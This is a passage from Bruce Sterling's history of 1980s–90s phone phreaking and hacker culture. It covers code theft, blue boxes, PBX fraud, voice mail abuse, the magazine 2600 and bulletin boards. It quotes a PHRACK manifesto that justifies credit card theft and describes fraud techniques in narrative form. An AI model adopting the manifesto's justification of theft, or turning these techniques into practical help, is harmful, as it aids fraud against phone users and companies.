phreaks  who  explore the system  for the sake of the intellectual challenge.  The New York metropolitan area  long in the vanguard of American crime  claims over 150,000 physical attacks on pay telephones every year!  Studied carefully, a modern payphone reveals itself as a little fortress, carefully designed and redesigned over generations, to resist coin slugs, zaps of electricity, chunks of coin shaped ice, prybars, magnets, lockpicks, blasting caps.  Public pay phones must survive in a world of unfriendly, greedy people, and a modern payphone is as exquisitely evolved as a cactus.    Because the phone network pre dates the computer network, the scofflaws known as  phone phreaks  pre date the scofflaws known as  computer hackers.   In practice, today, the line between  phreaking  and  hacking  is very blurred, just as the distinction between telephones and computers has blurred.  The phone system has been digitized, and computers have learned to  talk  over phone lines.  What's worse  and this was the point of the Mr. Jenkins of the Secret Service  some hackers have learned to steal, and some thieves have learned to hack.    Despite the blurring, one can still draw a few useful behavioral distinctions between  phreaks  and  hackers.   Hackers are intensely interested in the  system  per se, and enjoy relating to machines.   Phreaks  are more social, manipulating the system in a rough and ready fashion in order to get through to other human beings, fast, cheap and under the table.    Phone phreaks love nothing so much as  bridges,  illegal conference calls of ten or twelve chatting conspirators, seaboard to seaboard, lasting for many hours  and running, of course, on somebody else's tab, preferably a large corporation's.    As phone phreak conferences wear on, people drop out  or simply leave the phone off the hook, while they sashay off to work or school or babysitting , and new people are phoned up and invited to join in, from some other continent, if possible. Technical trivia, boasts, brags, lies, head trip deceptions, weird rumors, and cruel gossip are all freely exchanged.    The lowest rung of phone phreaking is the theft of telephone access codes.  Charging a phone call to somebody else's stolen number is, of course, a pig easy way of stealing phone service, requiring practically no technical expertise.  This practice has been very widespread, especially among lonely people without much money who are far from home.  Code theft has flourished especially in college dorms, military bases, and, notoriously, among roadies for rock bands.  Of late, code theft has spread very rapidly among Third Worlders in the US, who pile up enormous unpaid long distance bills to the Caribbean, South America, and Pakistan.    The simplest way to steal phone codes is simply to look over a victim's shoulder as he punches in his own code number on a public payphone.  This technique is known as  shoulder  surfing,  and is especially common in airports, bus terminals, and train stations.  The code is then sold by the thief for a few dollars.  The buyer abusing the code has no computer expertise, but calls his Mom in New York, Kingston or Caracas and runs up a huge bill with impunity.  The losses from this primitive phreaking activity are far, far greater than the monetary losses caused by computer intruding hackers.    In the mid to late 1980s, until the introduction of sterner telco security measures, COMPUTERIZED code theft worked like a charm, and was virtually omnipresent throughout the digital underground, among phreaks and hackers alike.  This was accomplished through programming one's computer to try random code numbers over the telephone until one of them worked.  Simple programs to do this were widely available in the underground  a computer running all night was likely to come up with a dozen or so useful hits.  This could be repeated week after week until one had a large library of stolen codes.    Nowadays, the computerized dialling of hundreds of numbers can be detected within hours and swiftly traced.  If a stolen code is repeatedly abused, this too can be detected within a few hours.  But for years in the 1980s, the publication of stolen codes was a kind of elementary etiquette for fledgling hackers.  The simplest way to establish your bona fides as a raider was to steal a code through repeated random dialling and offer it to the  community  for use.  Codes could be both stolen, and used, simply and easily from the safety of one's own bedroom, with very little fear of detection or punishment.    Before computers and their phone line modems entered American homes in gigantic numbers, phone phreaks had their own special telecommunications hardware gadget, the famous  blue box.   This fraud device  now rendered increasingly useless by the digital evolution of the phone system  could trick switching systems into granting free access to long distance lines.  It did this by mimicking the system's own signal, a tone of 2600 hertz.    Steven Jobs and Steve Wozniak, the founders of Apple Computer, Inc., once dabbled in selling blue boxes in college dorms in California.  For many, in the early days of phreaking, blue boxing was scarcely perceived as  theft,  but rather as a fun  if sneaky  way to use excess phone capacity harmlessly. After all, the long distance lines were JUST SITTING THERE.... Whom did it hurt, really   If you're not DAMAGING the system, and you're not USING UP ANY TANGIBLE RESOURCE, and if nobody FIND OUT what you did, then what real harm have you done   What exactly HAVE you  stolen,  anyway   If a tree falls in the forest and nobody hears it, how much is the noise worth   Even now this remains a rather dicey question.    Blue boxing was no joke to the phone companies, however. Indeed, when RAMPARTS magazine, a radical publication in California, printed the wiring schematics necessary to create a mute box in June 1972, the magazine was seized by police and Pacific Bell phone company officials.  The mute box, a blue box variant, allowed its user to receive long distance calls free of charge to the caller.  This device was closely described in a RAMPARTS article wryly titled  Regulating the Phone Company In Your Home.   Publication of this article was held to be in violation of Californian State Penal Code section 502.7, which outlaws ownership of wire fraud devices and the selling of  plans or instructions for any instrument, apparatus, or device intended to avoid telephone toll charges.     Issues of RAMPARTS were recalled or seized on the newsstands, and the resultant loss of income helped put the magazine out of business.  This was an ominous precedent for free expression issues, but the telco's crushing of a radical  fringe magazine passed without serious challenge at the time. Even in the freewheeling California 1970s, it was widely felt that there was something sacrosanct about what the phone company knew  that the telco had a legal and moral right to protect itself by shutting off the flow of such illicit information. Most telco information was so  specialized  that it would scarcely be understood by any honest member of the public.  If not published, it would not be missed.  To print such material did not seem part of the legitimate role of a free press.    In 1990 there would be a similar telco inspired attack on the electronic phreak hacking  magazine  PHRACK. The PHRACK legal case became a central issue in the Hacker Crackdown, and gave rise to great controversy.  PHRACK would also be shut down, for a time, at least, but this time both the telcos and their law  enforcement allies would pay a much larger price for their actions.  The PHRACK case will be examined in detail, later.    Phone phreaking as a social practice is still very much alive at this moment.  Today, phone phreaking is thriving much more vigorously than the better known and worse feared practice of  computer hacking.   New forms of phreaking are spreading rapidly, following new vulnerabilities in sophisticated phone services.    Cellular phones are especially vulnerable  their chips can be re programmed to present a false caller ID and avoid billing.  Doing so also avoids police tapping, making cellular  phone abuse a favorite among drug dealers.   Call sell operations  using pirate cellular phones can, and have, been run right out of the backs of cars, which move from  cell  to  cell  in the local phone system, retailing stolen long distance service, like some kind of demented electronic version of the neighborhood ice cream truck.    Private branch exchange phone systems in large corporations can be penetrated  phreaks dial up a local company, enter its internal phone system, hack it, then use the company's own PBX system to dial back out over the public network, causing the company to be stuck with the resulting long distance bill. This technique is known as  diverting.    Diverting  can be very costly, especially because phreaks tend to travel in packs and never stop talking.  Perhaps the worst by product of this  PBX fraud  is that victim companies and telcos have sued one another over the financial responsibility for the stolen calls, thus enriching not only shabby phreaks but well paid lawyers.     Voice mail systems  can also be abused  phreaks can seize their own sections of these sophisticated electronic answering machines, and use them for trading codes or knowledge of illegal techniques.  Voice mail abuse does not hurt the company directly, but finding supposedly empty slots in your company's answering machine all crammed with phreaks eagerly chattering and hey duding one another in impenetrable jargon can cause sensations of almost mystical repulsion and dread.    Worse yet, phreaks have sometimes been known to react truculently to attempts to  clean up  the voice mail system. Rather than humbly acquiescing to being thrown out of their playground, they may very well call up the company officials at work  or at home  and loudly demand free voice mail addresses of their very own.  Such bullying is taken very seriously by spooked victims.    Acts of phreak revenge against straight people are rare, but voice mail systems are especially tempting and vulnerable, and an infestation of angry phreaks in one's voice mail system is no joke.  They can erase legitimate messages  or spy on private messages  or harass users with recorded taunts and obscenities. They've even been known to seize control of voice mail security, and lock out legitimate users, or even shut down the system entirely.    Cellular phone calls, cordless phones, and ship to shore telephony can all be monitored by various forms of radio  this kind of  passive monitoring  is spreading explosively today. Technically eavesdropping on other people's cordless and cellular phone calls is the fastest growing area in phreaking today.  This practice strongly appeals to the lust for power and conveys gratifying sensations of technical superiority over the eavesdropping victim.  Monitoring is rife with all manner of tempting evil mischief.  Simple prurient snooping is by far the most common activity.  But credit card numbers unwarily spoken over the phone can be recorded, stolen and used.  And tapping people's phone calls  whether through active telephone taps or passive radio monitors  does lend itself conveniently to activities like blackmail, industrial espionage, and political dirty tricks.    It should be repeated that telecommunications fraud, the theft of phone service, causes vastly greater monetary losses than the practice of entering into computers by stealth.  Hackers are mostly young suburban American white males, and exist in their hundreds  but  phreaks  come from both sexes and from many nationalities, ages and ethnic backgrounds, and are flourishing in the thousands.       The term  hacker  has had an unfortunate history.  This book, THE HACKER CRACKDOWN, has little to say about  hacking  in its finer, original sense.  The term can signify the free  wheeling intellectual exploration of the highest and deepest potential of computer systems.  Hacking can describe the determination to make access to computers and information as free and open as possible.  Hacking can involve the heartfelt conviction that beauty can be found in computers, that the fine aesthetic in a perfect program can liberate the mind and spirit. This is  hacking  as it was defined in Steven Levy's much praised history of the pioneer computer milieu, HACKERS, published in 1984.    Hackers of all kinds are absolutely soaked through with heroic anti bureaucratic sentiment.  Hackers long for recognition as a praiseworthy cultural archetype, the postmodern electronic equivalent of the cowboy and mountain man.  Whether they deserve such a reputation is something for history to decide.  But many hackers  including those outlaw hackers who are computer intruders, and whose activities are defined as criminal  actually attempt to LIVE UP TO this techno cowboy reputation.  And given that electronics and telecommunications are still largely unexplored territories, there is simply NO TELLING what hackers might uncover.    For some people, this freedom is the very breath of oxygen, the inventive spontaneity that makes life worth living and that flings open doors to marvellous possibility and individual empowerment.  But for many people  and increasingly so  the hacker is an ominous figure, a smart aleck sociopath ready to burst out of his basement wilderness and savage other people's lives for his own anarchical convenience.    Any form of power without responsibility, without direct and formal checks and balances, is frightening to people  and reasonably so.  It should be frankly admitted that hackers ARE frightening, and that the basis of this fear is not irrational.    Fear of hackers goes well beyond the fear of merely criminal activity.    Subversion and manipulation of the phone system is an act with disturbing political overtones.  In America, computers and telephones are potent symbols of organized authority and the technocratic business elite.    But there is an element in American culture that has always strongly rebelled against these symbols  rebelled against all large industrial computers and all phone companies.  A certain anarchical tinge deep in the American soul delights in causing confusion and pain to all bureaucracies, including technological ones.    There is sometimes malice and vandalism in this attitude, but it is a deep and cherished part of the American national character.  The outlaw, the rebel, the rugged individual, the pioneer, the sturdy Jeffersonian yeoman, the private citizen resisting interference in his pursuit of happiness  these are figures that all Americans recognize, and that many will strongly applaud and defend.    Many scrupulously law abiding citizens today do cutting  edge work with electronics  work that has already had tremendous social influence and will have much more in years to come.  In all truth, these talented, hardworking, law abiding, mature, adult people are far more disturbing to the peace and order of the current status quo than any scofflaw group of romantic teenage punk kids.  These law abiding hackers have the power, ability, and willingness to influence other people's lives quite unpredictably.  They have means, motive, and opportunity to meddle drastically with the American social order.  When corralled into governments, universities, or large multinational companies, and forced to follow rulebooks and wear suits and ties, they at least have some conventional halters on their freedom of action.  But when loosed alone, or in small groups, and fired by imagination and the entrepreneurial spirit, they can move mountains  causing landslides that will likely crash directly into your office and living room.    These people, as a class, instinctively recognize that a public, politicized attack on hackers will eventually spread to them  that the term  hacker,  once demonized, might be used to knock their hands off the levers of power and choke them out of existence.  There are hackers today who fiercely and publicly resist any besmirching of the noble title of hacker.  Naturally and understandably, they deeply resent the attack on their values implicit in using the word  hacker  as a synonym for computer  criminal.    This book, sadly but in my opinion unavoidably, rather adds to the degradation of the term.  It concerns itself mostly with  hacking  in its commonest latter day definition, i.e., intruding into computer systems by stealth and without permission.    The term  hacking  is used routinely today by almost all law enforcement officials with any professional interest in computer fraud and abuse.  American police describe almost any crime committed with, by, through, or against a computer as hacking.    Most importantly,  hacker  is what computer intruders choose to call THEMSELVES.  Nobody who  hacks  into systems willingly describes himself  rarely, herself  as a  computer intruder,   computer trespasser,   cracker,   wormer,   darkside hacker  or  high tech street gangster.   Several other demeaning terms have been invented in the hope that the press and public will leave the original sense of the word alone.  But few people actually use these terms.   I exempt the term  cyberpunk,  which a few hackers and law enforcement people actually do use.  The term  cyberpunk  is drawn from literary criticism and has some odd and unlikely resonances, but, like hacker, cyberpunk too has become a criminal pejorative today.     In any case, breaking into computer systems was hardly alien to the original hacker tradition.  The first tottering systems of the 1960s required fairly extensive internal surgery merely to function day by day.  Their users  invaded  the deepest, most arcane recesses of their operating software almost as a matter of routine.   Computer security  in these early, primitive systems was at best an afterthought.  What security there was, was entirely physical, for it was assumed that anyone allowed near this expensive, arcane hardware would be a fully qualified professional expert.    In a campus environment, though, this meant that grad students, teaching assistants, undergraduates, and eventually, all manner of dropouts and hangers on ended up accessing and often running the works.    Universities, even modern universities, are not in the business of maintaining security over information.  On the contrary, universities, as institutions, pre date the  information economy  by many centuries and are not for profit cultural entities, whose reason for existence  purportedly  is to discover truth, codify it through techniques of scholarship, and then teach it.  Universities are meant to PASS THE TORCH OF CIVILIZATION, not just download data into student skulls, and the values of the academic community are strongly at odds with those of all would be information empires.  Teachers at all levels, from kindergarten up, have proven to be shameless and persistent software and data pirates.  Universities do not merely  leak information  but vigorously broadcast free thought.    This clash of values has been fraught with controversy. Many hackers of the 1960s remember their professional apprenticeship as a long guerilla war against the uptight mainframe computer  information priesthood.   These computer  hungry youngsters had to struggle hard for access to computing power, and many of them were not above certain, er, shortcuts. But, over the years, this practice freed computing from the sterile reserve of lab coated technocrats and was largely responsible for the explosive growth of computing in general society  especially PERSONAL computing.    Access to technical power acted like catnip on certain of these youngsters.  Most of the basic techniques of computer intrusion  password cracking, trapdoors, backdoors, trojan horses  were invented in college environments in the 1960s, in the early days of network computing.  Some off the cuff experience at computer intrusion was to be in the informal resume of most  hackers  and many future industry giants.  Outside of the tiny cult of computer enthusiasts, few people thought much about the implications of  breaking into  computers.  This sort of activity had not yet been publicized, much less criminalized.    In the 1960s, definitions of  property  and  privacy  had not yet been extended to cyberspace.  Computers were not yet indispensable to society.  There were no vast databanks of vulnerable, proprietary information stored in computers, which might be accessed, copied without permission, erased, altered, or sabotaged.  The stakes were low in the early days  but they grew every year, exponentially, as computers themselves grew.    By the 1990s, commercial and political pressures had become overwhelming, and they broke the social boundaries of the hacking subculture.  Hacking had become too important to be left to the hackers.  Society was now forced to tackle the intangible nature of cyberspace as property, cyberspace as privately owned unreal estate.  In the new, severe, responsible, high stakes context of the  Information Society  of the 1990s,  hacking  was called into question.    What did it mean to break into a computer without permission and use its computational power, or look around inside its files without hurting anything   What were computer intruding hackers, anyway  how should society, and the law, best define their actions   Were they just BROWSERS, harmless intellectual explorers   Were they VOYEURS, snoops, invaders of privacy  Should they be sternly treated as potential AGENTS OF ESPIONAGE, or perhaps as INDUSTRIAL SPIES   Or were they best defined as TRESPASSERS, a very common teenage misdemeanor   Was hacking THEFT OF SERVICE    After all, intruders were getting someone else's computer to carry out their orders, without permission and without paying .  Was hacking FRAUD   Maybe it was best described as IMPERSONATION.  The commonest mode of computer intrusion was  and is  to swipe or snoop somebody else's password, and then enter the computer in the guise of another person  who is commonly stuck with the blame and the bills.    Perhaps a medical metaphor was better  hackers should be defined as  sick,  as COMPUTER ADDICTS unable to control their irresponsible, compulsive behavior.    But these weighty assessments meant little to the people who were actually being judged.  From inside the underground world of hacking itself, all these perceptions seem quaint, wrongheaded, stupid, or meaningless.  The most important self  perception of underground hackers  from the 1960s, right through to the present day  is that they are an ELITE.  The day to day struggle in the underground is not over sociological definitions  who cares   but for power, knowledge, and status among one's peers.    When you are a hacker, it is your own inner conviction of your elite status that enables you to break, or let us say  transcend,  the rules.  It is not that ALL rules go by the board.  The rules habitually broken by hackers are UNIMPORTANT rules  the rules of dopey greedhead telco bureaucrats and pig  ignorant government pests.    Hackers have their OWN rules, which separate behavior which is cool and elite, from behavior which is rodentlike, stupid and losing.  These  rules,  however, are mostly unwritten and enforced by peer pressure and tribal feeling.  Like all rules that depend on the unspoken conviction that everybody else is a good old boy, these rules are ripe for abuse.  The mechanisms of hacker peer pressure,  teletrials  and ostracism, are rarely used and rarely work.  Back stabbing slander, threats, and electronic harassment are also freely employed in down and  dirty intrahacker feuds, but this rarely forces a rival out of the scene entirely.  The only real solution for the problem of an utterly losing, treacherous and rodentlike hacker is to TURN HIM IN TO THE POLICE.  Unlike the Mafia or Medellin Cartel, the hacker elite cannot simply execute the bigmouths, creeps and troublemakers among their ranks, so they turn one another in with astonishing frequency.    There is no tradition of silence or OMERTA in the hacker underworld.  Hackers can be shy, even reclusive, but when they do talk, hackers tend to brag, boast and strut.  Almost everything hackers do is INVISIBLE  if they don't brag, boast, and strut about it, then NOBODY WILL EVER KNOW.  If you don't have something to brag, boast, and strut about, then nobody in the underground will recognize you and favor you with vital cooperation and respect.    The way to win a solid reputation in the underground is by telling other hackers things that could only have been learned by exceptional cunning and stealth.  Forbidden knowledge, therefore, is the basic currency of the digital underground, like seashells among Trobriand Islanders.  Hackers hoard this knowledge, and dwell upon it obsessively, and refine it, and bargain with it, and talk and talk about it.    Many hackers even suffer from a strange obsession to TEACH  to spread the ethos and the knowledge of the digital underground.  They'll do this even when it gains them no particular advantage and presents a grave personal risk.    And when that risk catches up with them, they will go right on teaching and preaching  to a new audience this time, their interrogators from law enforcement.  Almost every hacker arrested tells everything he knows  all about his friends, his mentors, his disciples  legends, threats, horror stories, dire rumors, gossip, hallucinations.  This is, of course, convenient for law enforcement  except when law enforcement begins to believe hacker legendry.    Phone phreaks are unique among criminals in their willingness to call up law enforcement officials  in the office, at their homes  and give them an extended piece of their mind. It is hard not to interpret this as BEGGING FOR ARREST, and in fact it is an act of incredible foolhardiness.  Police are naturally nettled by these acts of chutzpah and will go well out of their way to bust these flaunting idiots.  But it can also be interpreted as a product of a world view so elitist, so closed and hermetic, that electronic police are simply not perceived as  police,  but rather as ENEMY PHONE PHREAKS who should be scolded into behaving  decently.     Hackers at their most grandiloquent perceive themselves as the elite pioneers of a new electronic world.  Attempts to make them obey the democratically established laws of contemporary American society are seen as repression and persecution.  After all, they argue, if Alexander Graham Bell had gone along with the rules of the Western Union telegraph company, there would have been no telephones.  If Jobs and Wozniak had believed that IBM was the be all and end all, there would have been no personal computers.  If Benjamin Franklin and Thomas Jefferson had tried to  work within the system  there would have been no United States.    Not only do hackers privately believe this as an article of faith, but they have been known to write ardent manifestos about it.  Here are some revealing excerpts from an especially vivid hacker manifesto    The Techno Revolution  by  Dr. Crash,  which appeared in electronic form in PHRACK Volume 1, Issue 6, Phile 3.       To fully explain the true motives behind hacking, we must first take a quick look into the past.  In the 1960s, a group of MIT students built the first modern computer system. This wild, rebellious group of young men were the first to bear the name 'hackers.'  The systems that they developed were intended to be used to solve world problems and to benefit all of mankind.     As we can see, this has not been the case.  The computer system has been solely in the hands of big businesses and the government.  The wonderful device meant to enrich life has become a weapon which dehumanizes people.  To the government and large businesses, people are no more than disk space, and the government doesn't use computers to arrange aid for the poor, but to control nuclear death weapons.  The average American can only have access to a small microcomputer which is worth only a fraction of what they pay for it.  The businesses keep the true state of the art equipment away from the people behind a steel wall of incredibly high prices and bureaucracy.  It is because of this state of affairs that hacking was born. ...      Of course, the government doesn't want the monopoly of technology broken, so they have outlawed hacking and arrest anyone who is caught. ...  The phone company is another example of technology abused and kept from people with high prices. ...      Hackers often find that their existing equipment, due to the monopoly tactics of computer companies, is inefficient for their purposes.  Due to the exorbitantly high prices, it is impossible to legally purchase the necessary equipment.  This need has given still another segment of the fight   Credit Carding.  Carding is a way of obtaining the necessary goods without paying for them.  It is again due to the companies' stupidity that Carding is so easy, and shows that the world's businesses are in the hands of those with considerably less technical know how than we, the hackers.  ...      Hacking must continue.  We must train newcomers to the art of hacking. ...   And whatever you do, continue the fight. Whether you know it or not, if you are a hacker, you are a revolutionary.  Don't worry, you're on the right side.       The defense of  carding  is rare.  Most hackers regard credit card theft as  poison  to the underground, a sleazy and immoral effort that, worse yet, is hard to get away with. Nevertheless, manifestos advocating credit card theft, the deliberate crashing of computer systems, and even acts of violent physical destruction such as vandalism and arson do exist in the underground.  These boasts and threats are taken quite seriously by the police.  And not every hacker is an abstract, Platonic computer nerd.  Some few are quite experienced at picking locks, robbing phone trucks, and breaking and entering buildings.    Hackers vary in their degree of hatred for authority and the violence of their rhetoric.  But, at a bottom line, they are scofflaws.  They don't regard the current rules of electronic behavior as respectable efforts to preserve law and order and protect public safety.  They regard these laws as immoral efforts by soulless corporations to protect their profit margins and to crush dissidents.   Stupid  people, including police, businessmen, politicians, and journalists, simply have no right to judge the actions of those possessed of genius, techno  revolutionary intentions, and technical expertise.       Hackers are generally teenagers and college kids not engaged in earning a living.  They often come from fairly well  to do middle class backgrounds, and are markedly anti  materialistic  except, that is, when it comes to computer equipment .  Anyone motivated by greed for mere money  as opposed to the greed for power, knowledge and status  is swiftly written  off as a narrow minded breadhead whose interests can only be corrupt and contemptible.  Having grown up in the 1970s and 1980s, the young Bohemians of the digital underground regard straight society as awash in plutocratic corruption, where everyone from the President down is for sale and whoever has the gold makes the rules.    Interestingly, there's a funhouse mirror image of this attitude on the other side of the conflict.  The police are also one of the most markedly anti materialistic groups in American society, motivated not by mere money but by ideals of service, justice, esprit de corps, and, of course, their own brand of specialized knowledge and power.  Remarkably, the propaganda war between cops and hackers has always involved angry allegations that the other side is trying to make a sleazy buck.  Hackers consistently sneer that anti phreak prosecutors are angling for cushy jobs as telco lawyers and that computer crime police are aiming to cash in later as well paid computer security consultants in the private sector.    For their part, police publicly conflate all hacking crimes with robbing payphones with crowbars.  Allegations of  monetary losses  from computer intrusion are notoriously inflated.  The act of illicitly copying a document from a computer is morally equated with directly robbing a company of, say, half a million dollars.  The teenage computer intruder in possession of this  proprietary  document has certainly not sold it for such a sum, would likely have little idea how to sell it at all, and quite probably doesn't even understand what he has. He has not made a cent in profit from his felony but is still morally equated with a thief who has robbed the church poorbox and lit out for Brazil.    Police want to believe that all hackers are thieves.  It is a tortuous and almost unbearable act for the American justice system to put people in jail because they want to learn things which are forbidden for them to know.  In an American context, almost any pretext for punishment is better than jailing people to protect certain restricted kinds of information. Nevertheless, POLICING INFORMATION is part and parcel of the struggle against hackers.    This dilemma is well exemplified by the remarkable activities of  Emmanuel Goldstein,  editor and publisher of a print magazine known as 2600  THE HACKER QUARTERLY.  Goldstein was an English major at Long Island's State University of New York in the '70s, when he became involved with the local college radio station.  His growing interest in electronics caused him to drift into Yippie _TAP_ circles and thus into the digital underground, where he became a self described techno rat.  His magazine publishes techniques of computer intrusion and telephone  exploration  as well as gloating exposes of telco misdeeds and governmental failings.    Goldstein lives quietly and very privately in a large, crumbling Victorian mansion in Setauket, New York.  The seaside house is decorated with telco decals, chunks of driftwood, and the basic bric a brac of a hippie crash pad.  He is unmarried, mildly unkempt, and survives mostly on TV dinners and turkey  stuffing eaten straight out of the bag.  Goldstein is a man of considerable charm and fluency, with a brief, disarming smile and the kind of pitiless, stubborn, thoroughly recidivist integrity that America's electronic police find genuinely alarming.    Goldstein took his nom de plume, or  handle,  from a character in Orwell's _1984_, which may be taken, correctly, as a symptom of the gravity of his sociopolitical worldview.  He is not himself a practicing computer intruder, though he vigorously abets these actions, especially when they are pursued against large corporations or governmental agencies.  Nor is he a thief, for he loudly scorns mere theft of phone service, in favor of 'exploring and manipulating the system.'  He is probably best described and understood as a DISSIDENT.    Weirdly, Goldstein is living in modern America under conditions very similar to those of former East European intellectual dissidents.  In other words, he flagrantly espouses a value system that is deeply and irrevocably opposed to the system of those in power and the police.  The values in _2600_ are generally expressed in terms that are ironic, sarcastic, paradoxical, or just downright confused.  But there's no mistaking their radically anti authoritarian tenor.  _2600_ holds that technical power and specialized knowledge, of any kind obtainable, belong by right in the hands of those individuals brave and bold enough to discover them  by whatever means necessary.  Devices, laws, or systems that forbid access, and the free spread of knowledge, are provocations that any free and self respecting hacker should relentlessly attack.  The  privacy  of governments, corporations and other soulless technocratic organizations should never be protected at the expense of the liberty and free initiative of the individual techno rat.    However, in our contemporary workaday world, both governments and corporations are very anxious indeed to police information which is secret, proprietary, restricted, confidential, copyrighted, patented, hazardous, illegal, unethical, embarrassing, or otherwise sensitive.  This makes Goldstein persona non grata, and his philosophy a threat.    Very little about the conditions of Goldstein's daily life would astonish, say, Vaclav Havel.   We may note in passing that President Havel once had his word processor confiscated by the Czechoslovak police.   Goldstein lives by SAMIZDAT, acting semi openly as a data center for the underground, while challenging the powers that be to abide by their own stated rules   freedom of speech and the First Amendment.    Goldstein thoroughly looks and acts the part of techno  rat, with shoulder length ringlets and a piratical black fisherman's cap set at a rakish angle.  He often shows up like Banquo's ghost at meetings of computer professionals, where he listens quietly, half smiling and taking thorough notes.    Computer professionals generally meet publicly, and find it very difficult to rid themselves of Goldstein and his ilk without extralegal and unconstitutional actions.  Sympathizers, many of them quite respectable people with responsible jobs, admire Goldstein's attitude and surreptitiously pass him information.  An unknown but presumably large proportion of Goldstein's 2,000 plus readership are telco security personnel and police, who are forced to subscribe to _2600_ to stay abreast of new developments in hacking.  They thus find themselves PAYING THIS GUY'S RENT while grinding their teeth in anguish, a situation that would have delighted Abbie Hoffman  one of Goldstein's few idols .    Goldstein is probably the best known public representative of the hacker underground today, and certainly the best hated.  Police regard him as a Fagin, a corrupter of youth, and speak of him with untempered loathing.  He is quite an accomplished gadfly.    After the Martin Luther King Day Crash of 1990, Goldstein, for instance, adeptly rubbed salt into the wound in the pages of _2600_.   Yeah, it was fun for the phone phreaks as we watched the network crumble,  he admitted cheerfully.   But it was also an ominous sign of what's to come...  Some AT T people, aided by well meaning but ignorant media, were spreading the notion that many companies had the same software and therefore could face the same problem someday.  Wrong.  This was entirely an AT T software deficiency.  Of course, other companies could face entirely DIFFERENT software problems.  But then, so too could AT T.     After a technical discussion of the system's failings, the Long Island techno rat went on to offer thoughtful criticism to the gigantic multinational's hundreds of professionally qualified engineers.   What we don't know is how a major force in communications like AT T could be so sloppy.  What happened to backups   Sure, computer systems go down all the time, but people making phone calls are not the same as people logging on to computers.  We must make that distinction.  It's not acceptable for the phone system or any other essential service to 'go down.' If we continue to trust technology without understanding it, we can look forward to many variations on this theme.     AT T owes it to its customers to be prepared to INSTANTLY switch to another network if something strange and unpredictable starts occurring.  The news here isn't so much the failure of a computer program, but the failure of AT T's entire structure.     The very idea of this.... this PERSON.... offering  advice  about  AT T's entire structure  is more than some people can easily bear.  How dare this near criminal dictate what is or isn't  acceptable  behavior from AT T   Especially when he's publishing, in the very same issue, detailed schematic diagrams for creating various switching network signalling tones unavailable to the public.     See what happens when you drop a 'silver box' tone or two down your local exchange or through different long distance service carriers,  advises _2600_ contributor  Mr. Upsetter  in  How To Build a Signal Box.    If you experiment systematically and keep good records, you will surely discover something interesting.     This is, of course, the scientific method, generally regarded as a praiseworthy activity and one of the flowers of modern civilization.  One can indeed learn a great deal with this sort of structured intellectual activity.  Telco employees regard this mode of  exploration  as akin to flinging sticks of dynamite into their pond to see what lives on the bottom.    _2600_ has been published consistently since 1984.  It has also run a bulletin board computer system, printed _2600_ T  shirts, taken fax calls...  The Spring 1991 issue has an interesting announcement on page 45    We just discovered an extra set of wires attached to our fax line and heading up the pole.   They've since been clipped.   Your faxes to us and to anyone else could be monitored.     In the worldview of _2600_, the tiny band of techno rat brothers  rarely, sisters  are a beseiged vanguard of the truly free and honest.  The rest of the world is a maelstrom of corporate crime and high level governmental corruption, occasionally tempered with well meaning ignorance.  To read a few issues in a row is to enter a nightmare akin to Solzhenitsyn's, somewhat tempered by the fact that _2600_ is often extremely funny.    Goldstein did not become a target of the Hacker Crackdown, though he protested loudly, eloquently, and publicly about it, and it added considerably to his fame.  It was not that he is not regarded as dangerous, because he is so regarded. Goldstein has had brushes with the law in the past   in 1985, a _2600_ bulletin board computer was seized by the FBI, and some software on it was formally declared  a burglary tool in the form of a computer program.   But Goldstein escaped direct repression in 1990, because his magazine is printed on paper, and recognized as subject to Constitutional freedom of the press protection.  As was seen in the RAMPARTS case, this is far from an absolute guarantee.  Still, as a practical matter, shutting down _2600_ by court order would create so much legal hassle that it is simply unfeasible, at least for the present.  Throughout 1990, both Goldstein and his magazine were peevishly thriving.    Instead, the Crackdown of 1990 would concern itself with the computerized version of forbidden data.  The crackdown itself, first and foremost, was about BULLETIN BOARD SYSTEMS. Bulletin Board Systems, most often known by the ugly and un  pluralizable acronym  BBS,  are the life blood of the digital underground.  Boards were also central to law enforcement's tactics and strategy in the Hacker Crackdown.    A  bulletin board system  can be formally defined as a computer which serves as an information and message passing center for users dialing up over the phone lines through the use of modems.  A  modem,  or modulator demodulator, is a device which translates the digital impulses of computers into audible analog telephone signals, and vice versa.  Modems connect computers to phones and thus to each other.    Large scale mainframe computers have been connected since the 1960s, but PERSONAL computers, run by individuals out of their homes, were first networked in the late 1970s.  The  board  created by Ward Christensen and Randy Suess in February 1978, in Chicago, Illinois, is generally regarded as the first personal  computer bulletin board system worthy of the name.    Boards run on many different machines, employing many different kinds of software.  Early boards were crude and buggy, and their managers, known as  system operators  or  sysops,  were hard working technical experts who wrote their own software.  But like most everything else in the world of electronics, boards became faster, cheaper, better designed, and generally far more sophisticated throughout the 1980s.  They also moved swiftly out of the hands of pioneers and into those of the general public. By 1985 there were something in the neighborhood of 4,000 boards in America.  By 1990 it was calculated, vaguely, that there were about 30,000 boards in the US, with uncounted thousands overseas.    Computer bulletin boards are unregulated enterprises. Running a board is a rough and ready, catch as catch can proposition.  Basically, anybody with a computer, modem, software and a phone line can start a board.  With second hand equipment and public domain free software, the price of a board might be quite small  less than it would take to publish a magazine or even a decent pamphlet.  Entrepreneurs eagerly sell bulletin  board software, and will coach nontechnical amateur sysops in its use.    Boards are not  presses.   They are not magazines, or libraries, or phones, or CB radios, or traditional cork bulletin boards down at the local laundry, though they have some passing resemblance to those earlier media.  Boards are a new medium   they may even be a LARGE NUMBER of new media.    Consider these unique characteristics   boards are cheap, yet they can have a national, even global reach.  Boards can be contacted from anywhere in the global telephone network, at NO COST to the person running the board  the caller pays the phone bill, and if the caller is local, the call is free.  Boards do not involve an editorial elite addressing a mass audience.  The  sysop  of a board is not an exclusive publisher or writer  he is managing an electronic salon, where individuals can address the general public, play the part of the general public, and also exchange private mail with other individuals.  And the  conversation  on boards, though fluid, rapid, and highly interactive, is not spoken, but written.  It is also relatively anonymous, sometimes completely so.    And because boards are cheap and ubiquitous, regulations and licensing requirements would likely be practically unenforceable.  It would almost be easier to  regulate ,  inspect  and  license  the content of private mail  probably more so, since the mail system is operated by the federal government.  Boards are run by individuals, independently, entirely at their own whim.    For the sysop, the cost of operation is not the primary limiting factor.  Once the investment in a computer and modem has been made, the only steady cost is the charge for maintaining a phone line  or several phone lines .  The primary limits for sysops are time and energy.  Boards require upkeep.  New users are generally  validated   they must be issued individual passwords, and called at home by voice phone, so that their identity can be verified.  Obnoxious users, who exist in plenty, must be chided or purged.  Proliferating messages must be deleted when they grow old, so that the capacity of the system is not overwhelmed.  And software programs  if such things are kept on the board  must be examined for possible computer 